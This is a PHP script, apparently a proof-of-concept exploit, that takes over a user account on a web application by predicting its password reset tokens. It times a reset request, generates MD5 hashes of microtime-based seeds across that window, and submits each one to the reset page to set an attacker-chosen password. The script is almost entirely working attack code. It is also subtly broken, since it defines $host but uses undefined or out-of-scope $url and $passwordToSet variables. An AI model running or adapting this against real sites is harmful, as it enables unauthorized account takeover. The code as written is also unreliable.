<?php

$host = 'http://192.168.0.62';
$email = 'email%40yoursite.com';
$passwordToSet = 'password2';
$userId = '1';
$upperMargin = 0.35;
$lowerMargin = 0.02;

do {
	$first = microtime();
	file_get_contents("$url/forgot_password.html?emailAddress=$email&submit=request+reset&submitme=1");
	$second = microtime();

	$first = explode(' ', $first);
	$second = explode(' ', $second);
} while($first[1] !== $second[1] || $first[0] < '0.10000000' || $second[0] > '0.60000000');

$seconds = $first[1];
$start = balance($first[0] + $lowerMargin);
$end = balance($second[0] + $upperMargin);

printMsg("Creating range and starting attack, this can take a few hours");
printMsg("Got $seconds. Testing $start - $end");

$range = getRange($start, $end, $seconds, 1);

guess($range, $userId);

function guess($range, $id) {

	foreach ($range as $hash) {
		$url = "$url/forgot_password_reset.html?u=$id&h=$hash&submitme=1&password=$passwordToSet&confirmPassword=$passwordToSet";
		$res = file_get_contents($url);

		if(strpos($res, 'Your password has been reset')) {
			printMsg("New password set: $passwordToSet");
			break;
		}
	}
}

function getRange($ustart, $uend, $sec, $id) {
	$range = [];
	
	do {
		$range[] = md5("$ustart $sec" . $id);
		$ustart = balance($ustart + 0.00000100);

	} while($ustart < $uend);

	return $range;
}

function balance($string) {
	$length = strlen($string);
	if($length < 10) {
		do {
			$string .= '0';
			$length = strlen($string);
		} while($length < 10);
	}

	return $string;
}

function printMsg($msg, $good = true) {
	if($good) {
		echo "[+] $msg \n";
	} else {
		echo "[-] $msg \n";
	}
}
